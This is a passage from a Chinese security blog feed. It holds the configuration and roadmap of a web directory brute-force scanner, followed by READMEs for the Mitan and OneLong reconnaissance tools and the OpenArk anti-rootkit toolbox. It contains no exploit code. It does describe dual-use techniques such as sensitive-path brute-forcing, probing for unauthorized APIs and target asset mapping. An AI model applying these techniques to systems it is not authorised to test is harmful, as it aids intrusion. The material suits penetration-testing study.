class="line">129</span><br></pre></td><td class="code"><pre><span class="line">#递归扫描处理配置</span><br><span class="line">[RecursiveScan]</span><br><span class="line">#是否开启递归扫描:关闭:0;开启:1</span><br><span class="line">conf.recursive_scan = 0</span><br><span class="line">#遇到这些状态码，开启递归扫描。默认配置[301,403]</span><br><span class="line">conf.recursive_status_code = [301,403]</span><br><span class="line">#URL超过这个长度就退出扫描</span><br><span class="line">conf.recursive_scan_max_url_length = 60</span><br><span class="line">#这些后缀名不递归扫</span><br><span class="line">conf.recursive_blacklist_exts = ["html",'htm','shtml','png','jpg','webp','bmp','js','css','pdf','ini','mp3','mp4']</span><br><span class="line">#设置排除扫描的目录。默认配置空。其他配置：e.g:['/test1','/test2']</span><br><span class="line">#conf.exclude_subdirs = ['/test1','/test2']</span><br><span class="line">conf.exclude_subdirs = ""</span><br><span class="line"></span><br><span class="line">#扫描模式处理配置(4个模式，1次只能选择1个)</span><br><span class="line">[ScanModeHandler]</span><br><span class="line">#字典模式:关闭:0;单字典:1;多字典:2</span><br><span class="line">conf.dict_mode = 1</span><br><span class="line">#单字典模式的路径</span><br><span class="line">conf.dict_mode_load_single_dict = "dict_mode_dict.txt"</span><br><span class="line">#多字典模式的路径，默认配置dictmult</span><br><span class="line">conf.dict_mode_load_mult_dict = "dictmult"</span><br><span class="line">#爆破模式:关闭:0;开启:1</span><br><span class="line">conf.blast_mode = 0</span><br><span class="line">#生成字典最小长度。默认配置3</span><br><span class="line">conf.blast_mode_min = 3</span><br><span class="line">#生成字典最大长度。默认配置3</span><br><span class="line">conf.blast_mode_max = 3</span><br><span class="line">#默认字符集:a-z。暂未使用。</span><br><span class="line">conf.blast_mode_az = "abcdefghijklmnopqrstuvwxyz"</span><br><span class="line">#默认字符集:0-9。暂未使用。</span><br><span class="line">conf.blast_mode_num = "0123456789"</span><br><span class="line">#自定义字符集。默认配置"abc"。使用abc构造字典</span><br><span class="line">conf.blast_mode_custom_charset = "abc"</span><br><span class="line">#自定义继续字符集。默认配置空。</span><br><span class="line">conf.blast_mode_resume_charset = ""</span><br><span class="line">#爬虫模式:关闭:0;开启:1</span><br><span class="line">conf.crawl_mode = 0</span><br><span class="line">#用于生成动态敏感文件payload的后缀字典</span><br><span class="line">conf.crawl_mode_dynamic_fuzz_suffix = "crawl_mode_suffix.txt"</span><br><span class="line">#解析robots.txt文件。暂未实现。</span><br><span class="line">conf.crawl_mode_parse_robots = 0</span><br><span class="line">#解析html页面的xpath表达式</span><br><span class="line">conf.crawl_mode_parse_html = "//*/@href | //*/@src | //form/@action"</span><br><span class="line">#是否进行动态爬虫字典生成。默认配置1，开启爬虫动态字典生成。其他配置：e.g:关闭:0;开启:1</span><br><span class="line">conf.crawl_mode_dynamic_fuzz = 1</span><br><span class="line">#Fuzz模式:关闭:0;单字典:1;多字典:2</span><br><span class="line">conf.fuzz_mode = 0</span><br><span class="line">#单字典模式的路径。</span><br><span class="line">conf.fuzz_mode_load_single_dict = "fuzz_mode_dir.txt"</span><br><span class="line">#多字典模式的路径。默认配置:fuzzmult</span><br><span class="line">conf.fuzz_mode_load_mult_dict = "fuzzmult"</span><br><span class="line">#设置fuzz标签。默认配置{dir}。使用{dir}标签当成字典插入点，将http://target.com/{dir}.php替换成http://target.com/字典中的每一行.php。其他配置：e.g:{dir};{ext}</span><br><span class="line">#conf.fuzz_mode_label = "{ext}"</span><br><span class="line">conf.fuzz_mode_label = "{dir}"</span><br><span class="line"></span><br><span class="line">#处理payload配置。暂未实现。</span><br><span class="line">[PayloadHandler]</span><br><span class="line"></span><br><span class="line">#处理请求配置</span><br><span class="line">[RequestHandler]</span><br><span class="line">#自定义请求头。默认配置空。其他配置：e.g:test1=test1,test2=test2</span><br><span class="line">#conf.request_headers = "test1=test1,test2=test2"</span><br><span class="line">conf.request_headers = ""</span><br><span class="line">#自定义请求User-Agent。默认配置chrome的ua。</span><br><span class="line">conf.request_header_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"</span><br><span class="line">#自定义请求cookie。默认配置空，不设置cookie。其他配置e.g:cookie1=cookie1; cookie2=cookie2;</span><br><span class="line">#conf.request_header_cookie = "cookie1=cookie1; cookie2=cookie2"</span><br><span class="line">conf.request_header_cookie = ""</span><br><span class="line">#自定义401认证。暂未实现。因为自定义请求头功能可满足该需求(懒XD)</span><br><span class="line">conf.request_header_401_auth = ""</span><br><span class="line">#自定义请求方法。默认配置get方法。其他配置：e.g:get;head</span><br><span class="line">#conf.request_method = "head"</span><br><span class="line">conf.request_method = "get"</span><br><span class="line">#自定义每个请求超时时间。默认配置3秒。</span><br><span class="line">conf.request_timeout = 3</span><br><span class="line">#随机延迟(0-x)秒发送请求。参数必须是整数。默认配置0秒，无延迟。</span><br><span class="line">conf.request_delay = 0</span><br><span class="line">#自定义单个目标，请求协程线程数。默认配置30线程</span><br><span class="line">conf.request_limit = 30</span><br><span class="line">#自定义最大重试次数。暂未实现。</span><br><span class="line">conf.request_max_retries = 1</span><br><span class="line">#设置持久连接。是否使用session()。暂未实现。</span><br><span class="line">conf.request_persistent_connect = 0</span><br><span class="line">#302重定向。默认False，不重定向。其他配置：e.g:True;False</span><br><span class="line">conf.redirection_302 = False</span><br><span class="line">#payload后添加后缀。默认空，扫描时，不添加后缀。其他配置：e.g:txt;php;asp;jsp</span><br><span class="line">#conf.file_extension = "txt"</span><br><span class="line">conf.file_extension = ""</span><br><span class="line"></span><br><span class="line">#处理响应配置</span><br><span class="line">[ResponseHandler]</span><br><span class="line">#设置要记录的响应状态。默认配置[200]，记录200状态码。其他配置：e.g:[200,403,301]</span><br><span class="line">#conf.response_status_code = [200,403,301]</span><br><span class="line">conf.response_status_code = [200]</span><br><span class="line">#是否记录content-type响应头。默认配置1记录</span><br><span class="line">#conf.response_header_content_type = 0</span><br><span class="line">conf.response_header_content_type = 1</span><br><span class="line">#是否记录页面大小。默认配置1记录</span><br><span class="line">#conf.response_size = 0</span><br><span class="line">conf.response_size = 1</span><br><span class="line">#是否自动检测404页面。默认配置True，开启自动检测404.其他配置参考e.g:True;False</span><br><span class="line">#conf.auto_check_404_page = False</span><br><span class="line">conf.auto_check_404_page = True</span><br><span class="line">#自定义匹配503页面正则。暂未实现。感觉用不着，可能要废弃。</span><br><span class="line">#conf.custom_503_page = "page 503"</span><br><span class="line">conf.custom_503_page = ""</span><br><span class="line">#自定义正则表达式，匹配页面内容</span><br><span class="line">#conf.custom_response_page = "([0-9]){3}([a-z]){3}test"</span><br><span class="line">conf.custom_response_page = ""</span><br><span class="line">#跳过显示页面大小为x的页面，若不设置，请配置成"None"，默认配置“None”。其他大小配置参考e.g:None;0b;1k;1m</span><br><span class="line">#conf.skip_size = "0b"</span><br><span class="line">conf.skip_size = "None"</span><br><span class="line"></span><br><span class="line">#代理选项</span><br><span class="line">[ProxyHandler]</span><br><span class="line">#代理配置。默认设置“None”，不开启代理。其他配置e.g:{"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}</span><br><span class="line">#conf.proxy_server = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}</span><br><span class="line">conf.proxy_server = None</span><br><span class="line"></span><br><span class="line">#Debug选项</span><br><span class="line">[DebugMode]</span><br><span class="line">#打印payloads并退出</span><br><span class="line">conf.debug = 0</span><br><span class="line"></span><br><span class="line">#update选项</span><br><span class="line">[CheckUpdate]</span><br><span class="line">#github获取更新。暂未实现。</span><br><span class="line">conf.update = 0</span><br></pre></td></tr></tbody></table></figure><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><p>命令行参数解析全局初始化</p></li><li></li></ul><p>  engine初始化</p><ul><li><p>设置线程数</p></li><li></li></ul><p>  target初始化</p><ul><li></li></ul><pre><code>自动解析处理输入格式( -i,inputTarget)-  IP-  Domain-  URL-  IP/MASK-  IP Start-End</code></pre><ul><li><p>文件读入(-iF,inputLocalFile)</p></li><li></li></ul><p>  bruter初始化</p><ul><li></li></ul><pre><code>加载配置方式()-  读取命令行参数值-  读取配置文件(-lcf,loadConfigFile)</code></pre><ul><li></li></ul><pre><code>递归模式选项(RecursiveScan)-  递归扫描(-rs,recursive_scan)-  需要递归的状态码(-rd,recursive_status_code)-  排除某些目录(-es,exclude_subdirs)</code></pre><ul><li></li></ul><pre><code>扫描模式选项(ScanModeHandler)-    字典模式(-dm,dict_mode)  -  加载单个字典(-dmlsd,dict_mode_load_single_dict)  -  加载多个字典(-dmlmd,dict_mode_load_mult_dict)-    爆破模式(-bm,blast_mode)  -      爆破目录长度范围(必选)    -  最小长度(-bmmin,blast_mode_min)    -  最大长度(-bmmax,blast_mode_max)  -      基于默认字符集    -  基于a-z    -  基于0-9  -  基于自定义字符集(-bmcc,blast_mode_custom_charset)  -  断点续生成payload(-bmrc,blast_mode_resume_charset)-    爬虫模式(-cm,crawl_mode)  -  自定义解析标签(-cmph,crawl_mode_parse_html)(a:href,img:src,form:action,script:src,iframe:src,div:src,frame:src,embed:src)  -  解析robots.txt(-cmpr,crawl_mode_parse_robots)  -  爬虫类动态fuzz扫描(-cmdf,crawl_mode_dynamic_fuzz)-    fuzz模式(-fm,fuzz_mode)  -  fuzz单个字典(-fmlsd,fuzz_mode_load_single_dict)  -  fuzz多个字典(-fmlmd,fuzz_mode_load_mult_dict)  -  fuzz标签(-fml,fuzz_mode_label)</code></pre><ul><li></li></ul><pre><code>请求优化选项(RequestHandler)-  自定义请求超时(-rt,request_timeout)-  自定义请求延时(-rd,request_delay)-  限制单个目标主机协程数扫描(-rl,request_limit)-  限制重试次数(-rmr,request_max_retries)-  http持久连接(-rpc,request_persistent_connect)-  自定义请求方法(-rm,request_method)(get、head)-  302状态处理(-r3,redirection_302)(是否重定向)-    自定义header  -  自定义其他header(-rh,request_headers)(解决需要401认证)  -  自定义ua(-rhua,request_header_ua)  -  自定义cookie(-rhc,request_header_cookie)</code></pre><ul><li></li></ul><pre><code>字典处理选项(PayloadHandler)-  字典处理(payload修改-去斜杠)-  字典处理(payload修改-首字符加斜杠)-  字典处理(payload修改-单词首字母大写)-  字典处理(payload修改-去扩展)-  字典处理(payload修改-去除非字母数字)</code></pre><ul><li></li></ul><pre><code>响应结果处理模块(ResponseHandler)-  跳过大小为x字节的文件(-ss,skip_size)-  自动检测404页面(-ac4p,auto_check_404_page)-  自定义503页面(-c5p,custom_503_page)-    自定义正则匹配响应内容并进行某种操作  -  自定义正则匹配响应(-crp,custom_response_page)  -  某种操作(暂时未定义)-  输出结果为自定义状态码(-rsc,response_status_code)-  输出payload为完整路径(默认输出完成url)-  输出结果展示content-type-  自动去重复保存结果</code></pre><ul><li></li></ul><pre><code>状态处理模块(StatusHandler)-  状态显示(等待开始、进行中、暂停中、异常、完成)-  进度显示-  状态控制(开始、暂停、继续、停止)-  续扫模块(暂未配置)-  断点续扫-  选行续扫</code></pre><ul><li></li></ul><pre><code>日志记录模块(ScanLogHandler)-  扫描日志-  错误日志</code></pre><ul><li></li></ul><pre><code>代理模块(ProxyHandler)-  单个代理(-ps,proxy_server)-  代理池</code></pre><ul><li></li></ul><pre><code>调试模式选项(DebugMode)-  debug(--debug)</code></pre><ul><li></li></ul><pre><code>检查更新选项(CheckUpdate)-  update(--update)</code></pre><h1 id="默认字典文件"><a href="#默认字典文件" class="headerlink" title="默认字典文件"></a>默认字典文件</h1><p>字典文件存放在项目根目录中的<code>data</code>文件夹中</p><ol><li>dict_mode_dict.txt “字典模式”字典，使用dirsearch默认字典</li><li>crawl_mode_suffix.txt “爬虫模式”字典，使用FileSensor默认字典</li><li>fuzz_mode_dir.txt “fuzz模式”字典，使用DirBuster默认字典</li><li>fuzz_mode_ext.txt “fuzz模式”字典，使用常见后缀制作的字典</li><li>dictmult 该目录为“字典模式”默认多字典文件夹，包含：BAK.min.txt(备份文件小字典)，BAK.txt(备份文件大字典)，LEAKS.txt(信息泄露文件字典)</li><li>fuzzmult 该目录为“fuzz模式”默认多字典文件夹，包含：fuzz_mode_dir.txt(默认目录字典)，fuzz_mode_ext.txt(默认后缀字典)</li></ol><h1 id="已知缺陷"><a href="#已知缺陷" class="headerlink" title="已知缺陷"></a>已知缺陷</h1><ol><li>“爬虫模式”只爬取了目标的当前页面，用于生成动态字典。项目将来会将“爬虫模块”与“生成动态字典功能”分离。</li><li>关于bruter.py第517行<code>bar.log.start()</code>出错。解决方案：请安装progressbar2。卸载progressbar。防止导入同名模块。感谢某位表哥提醒。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行命令：</span><br><span class="line">python3 -m pip uninstall progressbar</span><br><span class="line">python3 -m pip install progressbar2</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
          <category> 目录/敏感文件爆破工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>59-专业黑客都在用的信息收集工具</title>
      <link href="/2024/05/23/59-%E4%B8%93%E4%B8%9A%E9%BB%91%E5%AE%A2%E9%83%BD%E5%9C%A8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/05/23/59-%E4%B8%93%E4%B8%9A%E9%BB%91%E5%AE%A2%E9%83%BD%E5%9C%A8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p><img src="https://pic.imgdb.cn/item/663b27bd0ea9cb14033c3311.png"></p><h2 id="密探——渗透测试工具-v1-10-作者：kkbo8005-gmail-com"><a href="#密探——渗透测试工具-v1-10-作者：kkbo8005-gmail-com" class="headerlink" title="密探——渗透测试工具 v1.10 作者：kkbo8005@gmail.com"></a>密探——渗透测试工具 v1.10 作者：<a href="mailto:kkbo8005@gmail.com">kkbo8005@gmail.com</a></h2><p>链接:<a href="https://github.com/kkbo8005/mitan">https://github.com/kkbo8005/mitan</a></p><p>下载链接:<a href="https://github.com/kkbo8005/mitan/releases/tag/1.10">https://github.com/kkbo8005/mitan/releases/tag/1.10</a></p><p><strong>注意：下载1.10版本edu.cn有问题的请重新下载，修bug的时候修出问题了，不好意思！麻烦下载最新的！</strong></p><h3 id="1-缘起"><a href="#1-缘起" class="headerlink" title="1.缘起"></a>1.缘起</h3><p>对于学习网络安全的小白来说，在渗透战过程中容易没有方向，密探借用FindSomeTh、SuperSearchPlus，御文件扫描、dirsearch、JSFinder，fofaviewer等工具，开发印度密探“渗透工具”，希望能够为大家提供，并向上述工具的开发者致敬！！</p><h3 id="2-功能介绍"><a href="#2-功能介绍" class="headerlink" title="2.功能介绍"></a>2.功能介绍</h3><p>密探主要包含域名信息查询、IP端口查询、备案信息查询、搜索引擎语法自动生成（<strong>FOFA、Hunter、google、github</strong>）、资产测绘（<strong>FOFA，hunter，quake</strong>的查询及结果导出）、指纹识别、敏感信息（<strong>暴露接口并可以自动探测未授权</strong>）、文件扫描（包含<strong>目录，备份文件，spring信息泄漏，自定义字典</strong>等）、渗透技能路线备忘录，常用网络安全网站导航等功能。</p><p>我 <strong>不为自己使用该工具而感到遗憾，因为我将为任何后果或法律责任负责。</strong></p><p>本 <strong>工具在扫描模块中使用多线程，在根据目标线程进行配置时，会发生线程不可达的情况，导致大规模扫描时线程服务出现故障。</strong></p><h3 id="3-更新日志"><a href="#3-更新日志" class="headerlink" title="3.更新日志"></a>3.更新日志</h3><table><thead><tr><th>2024.5.19</th><th>修复文件接口扫描失败是由于导出的bug，修复了资产测绘条件语句中包含的保留词导出的bug，增加重要信息复制功能。</th></tr></thead><tbody><tr><td>2024.5.15</td><td>增加了将工具里面的配置项保存到配置文件，启动加载功能，调整了资产测绘的导出方式，优化了文件扫描过滤功能，优化了扫描线程BUG，优化了主界面域名信息的正则表达式。优化了quake注册表项、高级会员的域名字段的bug，优化了使用中一些细节bug</td></tr><tr><td>2024.5.8</td><td>修改使用中各位师傅的bug，基本信息模块新增软件著作权，子域名，IP反查域名解析记录，资产测绘增加配置Hunter的多KEY轮询功能，文件目录扫描增加按域名+压缩文件后缀集成方式。</td></tr><tr><td>2024.5.6</td><td>增加体重信息，增加资产测绘自动加载，优化指纹扫描，接口扫描，文件目录扫描功能，增加密码字典功能。优化网站导航信息</td></tr><tr><td>2024.4.24</td><td>界面功能增强指纹识别扫描模块，支持从资产测绘联动到指纹识别，从指纹识别联动敏感信息、文件扫描模块</td></tr><tr><td>2024.4.20</td><td>增加资产测绘模块，调整界面布局，资产测绘支持fofa、hunter、quake3个引擎的查询，并支持右键菜单与敏感信息扫描、文件扫描模块的联动功能</td></tr><tr><td>2024.4.13</td><td>优化了接口未授权扫描的界面卡顿问题以及接口获取完成自动触发接口未授权扫描计算错误</td></tr><tr><td>2024.4.11</td><td>将敏感信息界面重构了，增加了接口抓取及未授权接口探测功能。（原来表达式感觉还不够完美，下一版再优化一下）</td></tr><tr><td>2024.4.7</td><td>优化文件扫描的多线程扫描功能，增加网站导航地址</td></tr></tbody></table><h3 id="4-如何运行"><a href="#4-如何运行" class="headerlink" title="4.如何运行"></a>4.如何运行</h3><p>在jdk8环境下运行以下语句：</p><p>jdk8下载链接:<a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">https://www.oracle.com/java/technologies/downloads/#java8-windows</a></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar mitan-jar-with-dependencies.jar</span><br><span class="line">`C:\Program Files\Java\jdk-1.8\bin\java.exe` -jar mitan-jar-with-dependencies.jar  #如果没有对应的java8的版本则使用这条命令</span><br></pre></td></tr></tbody></table></figure><p> 如果您不想输入这么长太长语句，可以通过以下脚本的方式启动：</p><ol><li>Mac/Linux 环境下，可以通过sh文件启动，首先给予<strong>start.sh</strong>权限。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x start.sh</span><br></pre></td></tr></tbody></table></figure><p>每次进出都会出现如下界面</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./start.sh</span><br></pre></td></tr></tbody></table></figure><ol><li>windows系统直接双击“ <strong>start.bat</strong> ”文件启动工具</li></ol><p>运行成功显示以下界面：</p><p><a href="https://github.com/kkbo8005/mitan/blob/master/Readme.assets/image-20240515144759168.png"><img src="https://github.com/kkbo8005/mitan/raw/master/Readme.assets/image-20240515144759168.png" alt="图像-20240515144759168"></a></p><p><a href="https://github.com/kkbo8005/mitan/blob/master/Readme.assets/image-20240515144818909.png"><img src="https://github.com/kkbo8005/mitan/raw/master/Readme.assets/image-20240515144818909.png" alt="图像-20240515144818909"></a></p><p><a href="https://github.com/kkbo8005/mitan/blob/master/Readme.assets/image-20240508111836877.png"><img src="https://github.com/kkbo8005/mitan/raw/master/Readme.assets/image-20240508111836877.png" alt="图像-20240508111836877"></a></p><h3 id="5-常见问题"><a href="#5-常见问题" class="headerlink" title="5.常见问题"></a>5.常见问题</h3><h4 id="（1）运行时错误提示：缺少JavaFX-运行时组件的解决方法。"><a href="#（1）运行时错误提示：缺少JavaFX-运行时组件的解决方法。" class="headerlink" title="（1）运行时错误提示：缺少JavaFX 运行时组件的解决方法。"></a>（1）运行时错误提示：缺少JavaFX 运行时组件的解决方法。</h4><p><strong>JavaFX 从 Java 11 开始从 JDK 中移除，JDK11 以上需要单独下载和配置 javaFx。</strong></p><h5 id="1-下载JavaFX-SDK"><a href="#1-下载JavaFX-SDK" class="headerlink" title="1. 下载JavaFX SDK"></a>1. 下载JavaFX SDK</h5><p>首先，从<a href="https://gluonhq.com/products/javafx/">Gluon</a>网站 下载对应操作系统的JavaFX SDK。</p><h5 id="2-解压到目录"><a href="#2-解压到目录" class="headerlink" title="2. 解压到目录"></a>2. 解压到目录</h5><p>将下载的JavaFX SDK 解压部署示例（例如<code>C:\javafx-sdk-21</code>）。</p><h5 id="3-运行-JAR-文件时指定-JavaFX-模块路径"><a href="#3-运行-JAR-文件时指定-JavaFX-模块路径" class="headerlink" title="3. 运行 JAR 文件时指定 JavaFX 模块路径"></a>3. 运行 JAR 文件时指定 JavaFX 模块路径</h5><p>在运行你的JAR文件时，需要指定JavaFX模块的路径。假设你的JavaFX SDK解压在<code>C:\javafx-sdk-21</code>，你可以使用它来运行你的JAR文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java --module-path "C:\javafx-sdk-21\lib" --add-modules javafx.controls,javafx.fxml -jar mitan-jar-with-dependencies.jar</span><br></pre></td></tr></tbody></table></figure><p>本次命令中：</p><ul><li><p><code>--module-path "C:\javafx-sdk-21\lib"</code>指定了JavaFX 模块的路径。</p></li><li><p><code>--add-modules javafx.controls,javafx.fxml</code>stran 所需的JavaFX 模块，根据您的应用程序需要添加其他模块。</p><p><strong>谢谢p1at0x，s0nd9r师傅在Issues中提出的解决方案，可自行根据操作系统修改start.bat或start.sh脚本文件，解决快速启动。</strong></p></li></ul><h4 id="（2）如果遇到界面乱码问题，建议启动指定的编码方式。"><a href="#（2）如果遇到界面乱码问题，建议启动指定的编码方式。" class="headerlink" title="（2）如果遇到界面乱码问题，建议启动指定的编码方式。"></a>（2）如果遇到界面乱码问题，建议启动指定的编码方式。</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java "-Dfile.encoding=UTF-8" -jar mitan-jar-with-dependencies.jar</span><br></pre></td></tr></tbody></table></figure><p><strong>可自行根据操作系统修改start.bat或start.sh脚本文件，解决快速启动。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>58-OpenArk-蓝队应急响应工具箱</title>
      <link href="/2024/05/22/58-OpenArk-%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7%E7%AE%B1/"/>
      <url>/2024/05/22/58-OpenArk-%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenArk"><a href="#OpenArk" class="headerlink" title="OpenArk "></a>OpenArk <a href="https://github.com/BlackINT3/OpenArk/blob/master/doc/resources/logo.png"><img src="https://github.com/BlackINT3/OpenArk/raw/master/doc/resources/logo.png" alt="image"></a></h1><p>github链接:<a href="https://github.com/BlackINT3/OpenArk?tab=readme-ov-file">https://github.com/BlackINT3/OpenArk?tab=readme-ov-file</a></p><p>下载链接:<a href="https://github.com/BlackINT3/OpenArk/releases/tag/v1.3.6">https://github.com/BlackINT3/OpenArk/releases/tag/v1.3.6</a></p><p><a href="https://camo.githubusercontent.com/025105f6a4b01fe290dc9ce59b43b85160aa76ce4edac55abe91eed41d4ff319/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4c47504c2d677265656e2e737667"><img src="https://camo.githubusercontent.com/025105f6a4b01fe290dc9ce59b43b85160aa76ce4edac55abe91eed41d4ff319/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4c47504c2d677265656e2e737667" alt="License"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li><a href="https://github.com/BlackINT3/OpenArk/blob/master/README.md">英文说明</a></li></ul><p>  OpenArk是一款Windows平台上的开源Ark工具. Ark是Anti-Rootkit（对抗恶意程序）的简写, OpenArk目标成为逆向工程师、编程人员的工具，同时也能为那些希望清理恶意软件的用户服务。以后也将会支持更多功能和命令。 <a href="https://github.com/BlackINT3/OpenArk/blob/master/doc/resources/snapshot-zh-v108.png"><img src="https://github.com/BlackINT3/OpenArk/raw/master/doc/resources/snapshot-zh-v108.png" alt="image"></a> <a href="https://github.com/BlackINT3/OpenArk/blob/master/doc/resources/snapshot-zh-01.png"><img src="https://github.com/BlackINT3/OpenArk/raw/master/doc/resources/snapshot-zh-01.png" alt="image"></a> <a href="https://github.com/BlackINT3/OpenArk/blob/master/doc/resources/snapshot-zh-02.png"><img src="https://github.com/BlackINT3/OpenArk/raw/master/doc/resources/snapshot-zh-02.png" alt="image"></a></p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li>进程 - 查看进程、线程、模块、句柄、内存、窗口、Token、内存扫描、PPL等信息，还有模块卸载、进程注入等功能。</li><li>内核 - 系统内核工具，例如：内存管理、驱动、热键、回调、过滤驱动、存储、IDT/SDT/NDIS/WFP等功能。</li><li>编程助手 - 程序员的工具箱。</li><li>扫描器 - PE/ELF文件解析器，以后会变成病毒分析助手。</li><li>捆绑器 - 目录和多个程序可以捆绑成一个exe程序，同时支持脚本。</li><li>工具库 - 精心挑选了许多有用的小工具，这些和OpenArk既有功能互补，高效率，我们一直在思考。</li><li>控制台 - 这里有很多有用的命令。</li><li>语言 - 目前支持中文和英文，以后会支持更多。</li><li>更多强大的功能正在开发中。。。</li></ul><h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><ul><li>程序：独立的exe，无DLL依赖，支持32位、64位。</li><li>支持系统：Windows XP … Win7 … Win10 … Win11 …</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul><li><a href="https://github.com/BlackINT3/OpenArk/blob/master/doc/build-openark.md">如何编译OpenArk</a></li><li><a href="https://github.com/BlackINT3/none">UNONE &amp; KNONE</a> - 应用层和内核层的基础库</li></ul><h3 id="参与-捐赠"><a href="#参与-捐赠" class="headerlink" title="参与/捐赠"></a>参与/捐赠</h3><ul><li>欢迎提交Issue和PR.</li><li>如果你喜欢OpenArk，可以在软件上点击捐赠，支持我们的开发工作。</li><li><a href="https://github.com/BlackINT3/OpenArk/blob/master/doc/code-style-guide.md">OpenArk 代码风格</a></li></ul><h3 id="技术交流"><a href="#技术交流" class="headerlink" title="技术交流"></a>技术交流</h3><ul><li>Discord<ul><li><a href="https://discord.com/invite/w9A8q9naDY">https://discord.com/invite/w9A8q9naDY</a></li></ul></li><li>QQ群:<ul><li>4群: 960562534</li><li>3群: 706663529(已满)</li><li>2群: 535752025(已满)</li><li>1群: 836208099(已满)</li></ul></li></ul><h3 id="官方链接"><a href="#官方链接" class="headerlink" title="官方链接"></a>官方链接</h3><ul><li>官方网站: <a href="https://openark.blackint3.com/">https://openark.blackint3.com/</a></li><li>项目地址: <a href="https://github.com/BlackINT3/OpenArk/">https://github.com/BlackINT3/OpenArk/</a></li><li>帮助手册: <a href="https://openark.blackint3.com/manuals/">https://openark.blackint3.com/manuals/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>57-OneLong-红队快速信息收集工具-漏洞利用</title>
      <link href="/2024/05/21/57-OneLong-%E7%BA%A2%E9%98%9F%E5%BF%AB%E9%80%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2024/05/21/57-OneLong-%E7%BA%A2%E9%98%9F%E5%BF%AB%E9%80%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="OneLong"><a href="#OneLong" class="headerlink" title="OneLong"></a>OneLong</h1><p>链接:<a href="https://github.com/M0nster3/OneLong/">https://github.com/M0nster3/OneLong/</a></p><p>下载链接:<a href="https://github.com/M0nster3/OneLong/releases">https://github.com/M0nster3/OneLong/releases</a></p><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。</p><h2 id="0x01、介绍"><a href="#0x01、介绍" class="headerlink" title="0x01、介绍"></a>0x01、介绍</h2><p>作者：<a href="https://github.com/M0nster3">Monster3</a></p><p>定位：为了简化前期信息收集的繁重任务，协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点，暂时实现了收集企业信息，子域名收集，子域名爆破，资产邮箱，指纹探测，漏洞扫描，后台识别，后续会跟新对IP相关的搜集。</p><h2 id="0x02、使用"><a href="#0x02、使用" class="headerlink" title="0x02、使用"></a>0x02、使用</h2><p>使用方式比较简单，现在主要针对不同需求实现了两种信息收集的方式，一种是根据企业关键字去进行信息搜集，这里需要填写aqc和qcc的API，第二种方式是需要填写公司域名，去进行搜集</p><p>注意：在调用API的时候有些需要科学上网，<em><strong>最好在进行使用的时候加上-proxy=<a href="http://127.0.0.1:7897/">http://127.0.0.1:7897</a></strong></em> 进行科学上网。</p><p>1、根据企业关键字去进行信息搜集，最后填写正确完整的关键字，这部分主要参考了<a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a>,相关搜索企业细节以及方法和它是一样，注意的是使用这种方式必须填写aqc和qcc的Cookie</p><ul><li><em><strong>OneLong -n 企业名称 -proxy=<a 